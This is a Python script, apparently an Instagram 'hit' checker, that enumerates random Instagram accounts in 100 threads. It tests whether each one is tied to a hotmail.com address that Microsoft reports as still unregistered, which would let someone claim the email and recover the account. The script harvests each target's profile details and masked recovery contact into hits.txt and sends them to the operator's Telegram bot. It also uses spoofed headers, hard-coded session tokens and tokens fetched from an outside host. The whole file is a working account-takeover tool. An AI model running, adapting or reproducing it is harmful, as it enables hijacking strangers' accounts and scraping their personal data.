from hashlib import md5
from time import time
import requests
from uuid import uuid4
import os
from random import choice,randrange
import sys
from threading import Thread
from user_agent import generate_user_agent
#------------------------------[الالوان]------------------------------
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
Z1 = '\033[2;31m' #احمر ثاني
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
A = "\033[1;91m" #red
C = "\033[1;97m" #white
#------------------------------[ @zc_67  •  @MHND_X1 ]------------------------------
class qredes:
  def __init__(self):
    self.hits=0
    self.bad_email=0
    self.bad_instgram=0
    self.good_insgram=0
    self.token=input(Y+'[+] Enter Token : ')
    os.system('clear' if os.name == 'posix' else 'cls')
    self.id=input(X+'[+] Enter ID : ')
    os.system('clear' if os.name == 'posix' else 'cls')
    while True:
      try:
          headers = {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'accept-language': 'en-US,en;q=0.9',
      'upgrade-insecure-requests': '1',
      'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    }
          response = requests.get('https://signup.live.com/signup', headers=headers)
          canary=str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
          self.amsc=response.cookies.get_dict()['amsc']
          cookies = {
      'amsc': self.amsc,
    }
          headers = {
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9',
      'canary': canary,
      'content-type': 'application/json; charset=utf-8',
      'origin': 'https://signup.live.com',
      'referer': 'https://signup.live.com/',
      'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    }
          json_data = {
      'clientExperiments': [
          {
              'parallax': 'enableplaintextforsignupexperiment',
              'control': 'enableplaintextforsignupexperiment_control',
              'treatments': [
                  'enableplaintextforsignupexperiment_treatment',
              ],
          },
      ],
    }
          response = requests.post(
      'https://signup.live.com/API/EvaluateExperimentAssignments',
      cookies=cookies,
      headers=headers,
      json=json_data,
    ).json()
          self.canary=response['apiCanary']
          break
      except:
        os.system('clear' if os.name == 'posix' else 'cls')
        print('errors get hotmail tokens')
    os.system('clear' if os.name == 'posix' else 'cls')
 #   self.gmail_tokens()
    for _ in range(100):
        Thread(target=self.home).start()
  def insta1(self,email):
    while True:
      try:
        csrftoken = md5(str(time()).encode()).hexdigest()
        headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36 InstagramLite 1.0.0.0.145 Android (33/13; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_IQ_#u-nu-latn; 115357035)',
                'x-csrftoken': csrftoken,
            }

        data = {
            'username': email,
        }

        response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data).text
        if 'showAccountRecoveryModal' in response:
          return True
        else:
          return False
      except:''
  def insta2(self,email):
    while True:
      try:
        url = 'https://b.i.instagram.com/api/v1/accounts/login/'
        headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                         'Cookie':'missing',
                         'Accept-Encoding':'gzip, deflate',
                         'Accept-Language':'en-US',
                         'X-IG-Capabilities':'3brTvw==',
                         'X-IG-Connection-Type':'WIFI',
                         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                      'Host':'i.instagram.com'}
        uid = str(uuid4())
        data = {
        'uuid':uid, 
        'password':'ffffdddddaaa666', 
        'username':email,
        'device_id':uid, 
        'from_reg':'false', 
        '_csrftoken':'missing', 
        'login_attempt_countn':'0'
           }
        re = requests.post(url,headers=headers,data=data).text
        if 'bad_password' in re:
          return True
        else:
          return False
      except:''
  def gmail_tokens(self):
    while True:
      try:
        try:
          ii=open('gmail_tokens.txt','r').read().splitlines()[0].split('////')
          email=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn1234567890.') for _ in range(randrange(10,15)))
          __Host_GAPS=ii[0]
          s1=ii[1]
          TL=ii[2]
          hl=ii[3]
          at=ii[4]
          cookies = {
            '__Host-GAPS': __Host_GAPS,
        }
          headers = {
            'accept': '*/*',
            'accept-language': 'en',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36 Edg/126.0.0.0',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }
          params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',
            'hl': hl,
            'TL': TL,

        }
          data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22'+email+'%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
          response = requests.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        ).text
          if 'password' in response:
            return
          else:
            while True:
              try:
                g=requests.get('https://tokens.pythonanywhere.com/').json()['tokens']
                TL=g['TL']
                at=g['at']
                hl=g['hl']
                __Host_GAPS=g['__Host-GAPS']
                s1=g['s1']
                break
              except:''
            try:os.remove('gmail_tokens.txt')
            except:''
            with open(f'gmail_tokens.txt','a') as f:
              f.write(f'{__Host_GAPS}////{s1}////{TL}////{hl}////{at}')
        except:
          while True:
            try:
              g=requests.get('https://tokens.pythonanywhere.com/').json()['tokens']
              TL=g['TL']
              at=g['at']
              hl=g['hl']
              __Host_GAPS=g['__Host-GAPS']
              s1=g['s1']
              break
            except:''
          try:os.remove('gmail_tokens.txt')
          except:''
          with open(f'gmail_tokens.txt','a') as f:
            f.write(f'{__Host_GAPS}////{s1}////{TL}////{hl}////{at}')
        return
      except:''

  def check_gmail(self,email):
    while True:
      try:
        if '@' in email:
          email=email.split('@')[0]
        self.gmail_tokens()
        ii=open('gmail_tokens.txt','r').read().splitlines()[0].split('////')
        __Host_GAPS=ii[0]
        s1=ii[1]
        TL=ii[2]
        hl=ii[3]
        at=ii[4]
        cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
        headers = {
        'accept': '*/*',
        'accept-language': 'en',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36 Edg/126.0.0.0',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }
        params = {
        'rpcids': 'NHJMOd',
        'source-path': '/lifecycle/steps/signup/username',
        'hl': hl,
        'TL': TL,

    }
        data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22'+email+'%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
        response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    ).text
        if 'password' in response:
          return True
        else:
          return False
      except Exception as e:print(str(e))
  def get_info(self,username,domen):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
             'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356',
        }
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+username+'"}',
            'ig_sig_key_version': '4',
        } 
        try:
            response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,)
            rest = response.json()['email']
        except:
            rest = None
        headers = {
            'accept': '*/*',
            'accept-language': 'en',
            'referer': 'https://www.instagram.com/{}/'.format(username),
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'username': username,
        }
        try:response = requests.get(
                'https://www.instagram.com/api/v1/users/web_profile_info/',
                params=params,
                headers=headers,
            ).json()
        except:response=None
        try:
            id=response['data']['user']['id']
        except:
            id=None
        try:
            followerNum=response['data']['user']['edge_followed_by']['count']
        except:
            followerNum=None
        try:
            followingNum=response['data']['user']['edge_follow']['count']
        except:
            followingNum=None
        try:
            postNum=response['data']['user']['edge_owner_to_timeline_media']['count']
        except:
            postNum=None
        try:
            isPraise=response['data']['user']['is_private']
        except:
            isPraise=None
        try:
            full_name=response['data']['user']['full_name']
        except:
            full_name=None
        try:
            biography=response['data']['user']['biography']
        except:
            biography=None
        try:
            if id == None:date=None
            else:
                try:
                    date=requests.get('https://mel7n.pythonanywhere.com/?id={}'.format(id)).json()['date']
                except:date=None
        except:date=None
        info='''

  ⌯ Hit Ansta
  
  𝐅𝐎l𝐎𝐖𝐄𝐑𝐒 : {}
  𝐅𝐎ll𝐎𝐖𝐈𝐍𝐆 : {}
  total posts : {}
  isPraise : {}
  𝗨𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {}
  𝐄𝐌𝐀𝐈l : {}@{}
  𝐃𝐀𝐓𝐄 : {}
  id : {}
  𝐅𝗨ll 𝐍𝐀𝐌𝐄 : {}
  𝐁𝐈𝐎 : {}
  𝑅𝐸𝑆𝑇 : {}
  
  𝑃𝑌 : @MHND_X1  -  @zc_67
        '''.format(followerNum,followingNum,postNum,isPraise,username,username,domen,date,id,full_name,biography,rest)
        print(info)
        with open(f'hits.txt','a') as f:
            f.write(info+'\n')
    except:
        info='''

          ⌯ Hit Ansta
          
          𝐅𝐎l𝐎𝐖𝐄𝐑𝐒 : {}
          𝐅𝐎ll𝐎𝐖𝐈𝐍𝐆 : {}
          total posts : {}
          isPraise : {}
          𝗨𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {}
          𝐄𝐌𝐀𝐈l : {}@{}
          𝐃𝐀𝐓𝐄 : {}
          id : {}
          𝐅𝗨ll 𝐍𝐀𝐌𝐄 : {}
          𝐁𝐈𝐎 : {}
          𝑅𝐸𝑆𝑇 : {}
          
          𝑃𝑌 : @MHND_X1  -  @zc_67
                '''.format(None,None,None,None,username,username,domen,None,None,None,None,None)
        print(info)
        with open(f'hits.txt','a') as f:
            f.write(info+'\n')
    while True:
        try:
            requests.get('https://api.telegram.org/bot'+str(self.token)+'/sendMessage?chat_id='+str(self.id)+f'&text={info}');return
        except:''


  def check_hotmail(self,email):
    while True:
      try:
        cookies = {
  'amsc': self.amsc,
}
        headers = {
  'accept': 'application/json',
  'accept-language': 'en-US,en;q=0.9',
  'canary': self.canary,
  'content-type': 'application/json; charset=utf-8',
  'origin': 'https://signup.live.com',
  'referer': 'https://signup.live.com/',
  'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
}
        json_data = {
  'signInName': email,
}
        response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data).text
        if '"isAvailable":true' in response:
          return True
        else:
          return False
      except Exception as e:
         print(str(e))

  def get_username(self):
    while True:
      try:

          headers = {
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded',
              'origin': 'https://www.instagram.com',
              'priority': 'u=1, i',
              'sec-ch-prefers-color-scheme': 'dark',
              'sec-ch-ua': '"Opera";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
              'sec-ch-ua-full-version-list': '"Opera";v="111.0.5168.61", "Chromium";v="125.0.6422.143", "Not.A/Brand";v="24.0.0.0"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '"10.0.0"',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
              'x-asbd-id': '129477',
              'x-bloks-version-id': '213c82555f99bb0cecb045c627a22f08209d7a699fc238c7e73a0482e70267f9',
              'x-csrftoken': 'QOeFYsOi8enKuW80uC0WezhvEgiydc2Y',
              'x-fb-friendly-name': 'PolarisProfilePageContentDirectQuery',
              'x-fb-lsd': '3TdmFoJ7r2hQowntSy6Exd',
              'x-ig-app-id': '936619743392459',
              'x-ig-www-claim': 'hmac.AR3iNxyHufbREf9pIUL6m2ciMIIxA3vQTyCHW_yWjgu5dmsq',
          }
          data = {
              'av': '17841408545457742',
              '__user': '0',
              '__a': '1',
              '__req': '53',
              '__hs': '19920.HYP:instagram_web_pkg.2.1..0.1',
              'dpr': '1',
              '__ccg': 'UNKNOWN',
              '__rev': '1014910249',
              '__s': 'lgqvll:0onelj:i7g1ua',
              '__hsi': '7392194034338563714',
              '__dyn': '7xeUjG1mxu1syaxG4Vp41twpUnwgU7SbzEdF8vyUco2qwJyEiw9-1DwUx60p-0LVE4W0om78c87m0yE462mcw5Mx62G5UswoEcE7O2l0Fwqo31w9O1TwQzXw8W58jwGzEaE2iwNwKxm5o2eUlwhEe88o5i7U1bobpEbUGdwtUd-2u2J08O321LwTwKG1pg2fwxyo6O1FwlEcUed6goK2OubK5V89FbxG6Uf9EO6UaU',
              '__csr': 'iMkMF5NsIh2I4Aggpik9SLfZgxAZOsJh6DcNcUFXH-GHqnlaoSiypHBiVaFkhtdFmO-AjjKW8DS8UVrnJ3vihVXAiHApWyu8CWACiKWQArCWl24rBWaJaHGSbyHl5Dz8yprKaKGGmjy9EhKUy8BACKmmuXWyryp-8Bgqw059QwmGw9y5e0aLypngsDPG4k5d0oU7T-swvg14U2Nxpa4kqdiul0l9m0ieq1OwSggwlE36w3ePGeG092xq2K250k8louxClkUPowHDmok6U26xm0Qkao4FhKEJK5riP0loV0cS0tu13wwx1G4kyKsa1Kcxqm2aE6C0BsMy1PxiohDk8wd_h8146148A9Cg6mWm0H944ye4QfAwbiaU5eUhERkq2y1Twjo96E9Hp9UiQcg1EQ2Smlo7eUG6oB7w0ovEbu3q0d8w7vw2a8dS1ywBQ0tN0',
              '__comet_req': '7',
              'fb_dtsg': 'NAcN9-rfGhppacO0TiJS1KOuTzGJmIJqDEX_mLq8xVMayYEUgtoQyxQ:17853599968089360:1719656032',
              'jazoest': '26445',
              'lsd': '3TdmFoJ7r2hQowntSy6Exd',
              '__spin_r': '1014910249',
              '__spin_b': 'trunk',
              '__spin_t': '1721129295',
              'fb_api_caller_class': 'RelayModern',
              'fb_api_req_friendly_name': 'PolarisProfilePageContentDirectQuery',
              'variables': '{"id":"'+str(randrange(1,402149008))+'","render_surface":"PROFILE"}',
              'server_timestamps': 'true',
              'doc_id': '7663723823674585',
          }
          username = requests.post('https://www.instagram.com/graphql/query', cookies={}, headers=headers, data=data).json()['data']['user']['username']
          return [username]
      except Exception as e:''
  def home(self):
    while True:
        try:
            sys.stdout.write(f'''\rHits : {self.hits} Bad Instagram {self.bad_instgram} Bad Email : {self.bad_email} Good Instgram : {self.good_insgram}\r''')

            while True:
                try:
                    usernames=self.get_username()
                    if usernames == None:''
                    else:
                        break
                except:''
            for username in usernames:
                sys.stdout.write(f'''\rHits : {self.hits} Bad Instagram {self.bad_instgram} Bad Email : {self.bad_email} Good Instgram : {self.good_insgram}\r''')
             #   api1=choice('122')
                api2=choice('122')
            #    email1=username+'@gmail.com'
                email2=username+'@hotmail.com'
             #   if '1' == api1:
              #      s11=self.insta1(email1)
           #     elif '2' == api1:
            #        s11=self.insta2(email1)
                if '1' == api2:
                    s22=self.insta1(email2)
                elif '2' == api2:
                    s22=self.insta2(email2)
          #      if s11 == True:
            #        self.good_insgram+=1
            #        qq=self.check_gmail(email1)
             #       if qq == True:
              #          self.hits+=1
              #          username,domen=email1.split('@')
               #         self.get_info(username,domen)
              #      else:
                #        self.bad_email+=1
              #  else:
                #    self.bad_instgram+=1
                if s22 == True:
                    self.good_insgram+=1
                    qq=self.check_hotmail(email2)
                    if qq == True:
                        self.hits+=1
                        username,domen=email2.split('@')
                        self.get_info(username,domen)
                    else:
                        self.bad_email+=1
                else:
                    self.bad_instgram+=1
        except Exception as e:''

qredes()